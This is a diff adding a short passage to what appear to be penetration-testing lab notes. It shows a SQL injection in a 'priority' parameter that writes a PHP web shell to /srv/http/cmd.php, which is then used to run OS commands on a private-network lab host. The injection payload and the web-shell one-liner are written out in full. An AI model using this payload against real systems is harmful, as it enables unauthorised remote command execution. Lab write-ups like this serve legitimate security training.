@@ -428,7 +428,26 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221011103739.png)
 
+#GETtoPOSTChangeInBurpsuite
 
+#### -Googled "sql injection reverse shell" and found the following web page showing the following commands to upload a cmd.php page to the server in order to get command execution:
+
+![](Pasted%20image%2020221011103839.png)
+
+![](Pasted%20image%2020221011103926.png)
+
+#### -URL encoded the following the following commands:
+"' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'"
+
+#### -Added "priority='' paramater and the URL encoded syntax above into Burpsuite and forwarded the request:
+
+![](Pasted%20image%2020221011104021.png)
+
+#### -Navigated to "http://192.168.213.147:30455/cmd.php?cmd=" and typed "whoami" and confirmed we can run os commands:
+
+![](Pasted%20image%2020221011104107.png)
+
+#sqlinjection
 
 ---
 
